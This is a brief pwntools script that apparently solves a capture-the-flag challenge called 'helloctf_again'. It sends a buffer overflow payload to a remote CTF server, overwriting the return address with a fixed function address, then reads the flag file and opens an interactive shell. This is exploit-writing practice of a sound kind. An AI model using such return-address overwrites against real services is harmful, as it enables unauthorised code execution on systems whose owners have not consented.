from pwn import *

# p = process("helloctf_again")
p = remote('ctf.adl.tw', 10001)

magic = p64(0x401263)
p.recvuntil("?")

payload = b"yes\0" + b"a"*0x14
payload += magic

p.sendline(payload)

p.sendline('cat /home/`whoami`/flag')

p.interactive()
